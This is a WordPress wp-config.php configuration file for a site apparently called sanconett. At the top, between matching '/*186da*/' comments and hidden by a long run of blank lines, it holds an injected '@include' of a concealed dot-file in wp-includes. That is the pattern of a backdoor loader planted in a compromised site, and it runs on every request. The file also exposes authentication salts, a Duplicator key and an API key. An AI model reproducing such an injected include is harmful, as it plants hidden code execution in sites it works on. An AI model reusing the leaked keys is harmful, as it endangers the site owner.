<?php
/*186da*/

@include ("/home/g7qodve4u6hq/public_html/wp-includes/blocks/loginout/.d97b1e0b.otc");

/*186da*/








































































/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'WP_CACHE', false ); // By SiteGround Optimizer
define( 'WPCACHEHOME', 'C:\xampp\htdocs\sanconett-wp\wp-content\plugins\wp-super-cache/' );
define( 'DB_NAME', 'sanconettdb3' );

/** Database username */
define( 'DB_USER', 'root' );

// define( 'DB_USER', 'sanconettuser3' );

/** Database password */
define( 'DB_PASSWORD', '' );

// define( 'DB_PASSWORD', 'sanconettuser3' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'EWQhii|/q$<UR*fi]R@^Hc H).%?1uo=#Z#PEM6>;DT^K]afu<N@!gZ}.:SQb^:@' );
define( 'SECURE_AUTH_KEY',  'yW=7_!Cw4xQx$/k/.nb5W3S4=N&C!LRh;(~J?@_;Po@qlBg2w;*-h5@J4elziT(U' );
define( 'LOGGED_IN_KEY',    'Q#@lg=<tBceH.i}*5%=>[/Ry` 63%^runpR-P6fn`B5czAak(zvbL)rlPBXG_i*w' );
define( 'NONCE_KEY',        'q52Na`F!hSiVpBh;-K$=C9n6hJS)Uu#0,4jCnT (L ?uWZRS6}a7RX%(8l43v#XZ' );
define( 'AUTH_SALT',        '3l7SM.*4?atj1V+<vakp_:pNed2@$71=5$k|I 1o(Pl2S%l5;3pA:JC6&hN!&/?-' );
define( 'SECURE_AUTH_SALT', 'vw.6Z2keBiNpx9lJ_L_JC.F@?bD@H!$K _=LC1bXr(.1ai3arEqwep+be:=4 u[L' );
define( 'LOGGED_IN_SALT',   'iyZuKavnIHSrP+E,Roa3sI+%C^^&N.7xf=}8.Rx9S3@=+,t4m% KXJLI[XojvpHY' );
define( 'NONCE_SALT',       'F&j?i]9-<oi-cFpjn3,k3E{eeMkoI:S.%p.(jB0:p.p,3>=)3^a8+d_&(&:m& Y[' );
define( 'HUBSPOT_TO_SALESLINK_APP_ID', 'test');
define( 'HUBSPOT_TO_SALESLINK_APP_CLIENT_SECRET', 'test');
define( 'HUBSPOT_TO_SALESLINK_HUBSPOT_OAUTH_TOKEN', 'test');
define( 'HUBSPOT_TO_SALESLINK_LOG_PATH', 'Sam Cron Logs');
define( 'HUBSPOT_TO_SALESLINK_WEBHOOK_SECRET', 'test');
define( 'HUBSPOT_TO_SALESLINK_CLOUDLINK_API_BASE_URI', 'test');
define( 'HUBSPOT_TO_SALESLINK_CLOUDLINK_API_KEY', 'test');
define( 'SAM_API_KEY', 'VuHsvoNnugurrt9kgwhf5pL5bJ53ykImUqeGZQDa');

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



define( 'DUPLICATOR_AUTH_KEY', ']5r;_(*3U:u7SiEP?_O$d@oCyH,&qUX$Qp]W=jPs:BNa 2b^527)__,X0*]@KaMz' );
/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
